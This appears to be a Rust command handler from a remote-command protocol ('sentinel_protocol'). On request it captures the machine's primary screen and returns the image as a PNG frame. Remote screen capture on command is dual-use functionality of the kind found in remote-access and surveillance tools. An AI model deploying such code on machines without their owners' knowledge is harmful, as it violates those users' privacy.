use async_trait::async_trait;
use sentinel_protocol::commands::CommandHandler;
use sentinel_protocol::frame::Frame;
use sentinel_protocol::error::ProtocolError;
use bytes::Bytes;
use screenshots::Screen;
use std::io::Cursor;

pub struct ScreenshotHandler;

#[async_trait]
impl CommandHandler for ScreenshotHandler {
    async fn handle(&self, _frame: Frame) -> Result<Option<Frame>, ProtocolError> {
        println!("[SYSTEM]: Attempting screen capture...");

        let png_bytes = {
            let screens = Screen::all().map_err(|e| {
                eprintln!("Failed to find screens: {}", e);
                ProtocolError::ZeroLengthFrame
            })?;

            let screen = screens.first().ok_or_else(|| {
                eprintln!("No screens found");
                ProtocolError::ZeroLengthFrame
            })?;

            println!("[SYSTEM]: Capturing {:?}...", screen);
            
            let image = screen.capture().map_err(|e| {
                eprintln!("Capture failed: {}", e);
                ProtocolError::FrameTooLarge
            })?;

            let mut buffer = Cursor::new(Vec::new());
            image.write_to(&mut buffer, image::ImageFormat::Png)
                .map_err(|_| ProtocolError::FrameTooLarge)?;
            
            buffer.into_inner()
        };

        println!("[SYSTEM]: Capture successful! Size: {} bytes", png_bytes.len());

        let response = Frame::new(1, 0x07, Bytes::from(png_bytes))?;
        Ok(Some(response))
    }
}